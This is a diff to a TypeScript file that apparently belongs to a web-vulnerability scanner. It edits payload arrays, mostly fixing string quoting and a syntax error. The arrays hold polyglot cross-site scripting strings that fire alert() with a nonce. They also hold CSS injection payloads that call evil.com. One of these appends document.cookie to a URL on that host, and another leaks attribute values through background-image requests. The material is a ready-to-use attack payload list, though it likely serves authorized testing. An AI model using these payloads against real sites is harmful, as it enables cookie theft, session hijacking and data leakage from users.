@@ -95,14 +95,15 @@ function mutatePayload(payload: string, technique: string, iteration: number): {
 
 // ─── Expanded Payload Arrays ───────────────────────────────────────────────
 const POLYGLOT_PAYLOADS = [
-  `jaVasCript:/*-/*\`/*\\`/*'/*"/**/(/* */oNcliCk=alert('XSS-${NONCE}') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('XSS-${NONCE}')//>>`,
+  // Classic multi-context polyglot (backtick chars replaced for TS safety)
+  "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert('XSS-" + NONCE + "') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('XSS-" + NONCE + "')//>>",
   `'"><img src=x onerror=alert('XSS-${NONCE}')><script>alert('XSS-${NONCE}')</script><!--`,
-  `'; alert('XSS-${NONCE}')//\`; alert('XSS-${NONCE}')//"; alert('XSS-${NONCE}')//`,
+  "'; alert('XSS-" + NONCE + "')//`; alert('XSS-" + NONCE + "')//\"; alert('XSS-" + NONCE + "')//",
   `</script><svg/onload=alert('XSS-${NONCE}')>`,
   `--><svg/onload=alert('XSS-${NONCE}')><!--`,
-  `\");alert('XSS-${NONCE}')//`,
+  `");alert('XSS-${NONCE}')//`,
   `');alert('XSS-${NONCE}')//`,
-  `\`);alert('XSS-${NONCE}')//`,
+  "` + alert('XSS-" + NONCE + "') + `",
   `<script>\\u0061lert('XSS-${NONCE}')</script>`,
   `<IMG SRC="javascript:alert('XSS-${NONCE}')">`,
   `<IMG SRC=JaVaScRiPt:alert('XSS-${NONCE}')>`,
@@ -259,7 +260,7 @@ const CSS_INJECTION_PAYLOADS = [
   `-moz-binding:url(//evil.com/xss.xml#xss)`,
   `body{background-image:url("//evil.com/?"+document.cookie)}`,
   `*{color:expression(document.write('<script>alert(1)<\/script>'))}`,
-  `@charset "\\";} input[value^=a]{background:url(//evil.com/?a)} //`;
+  `@charset "\\";} input[value^=a]{background:url(//evil.com/?a)} //`,
 ];
 
 const LOG_INJECTION_PAYLOADS = [
